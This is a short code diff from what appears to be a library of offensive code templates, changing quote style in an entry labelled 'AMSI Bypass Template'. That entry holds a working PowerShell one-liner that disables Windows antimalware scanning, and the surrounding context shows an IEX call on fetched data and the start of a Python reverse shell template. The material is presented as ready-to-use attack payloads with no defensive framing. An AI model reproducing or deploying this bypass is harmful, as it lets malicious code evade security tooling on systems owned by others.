@@ -166,7 +166,7 @@ IEX($data)`,
     name: 'AMSI Bypass Template',
     language: 'powershell',
     icon: '🛡️',
-    code: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
+    code: `[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)`,
   },
   {
     id: 'py-reverse-shell',
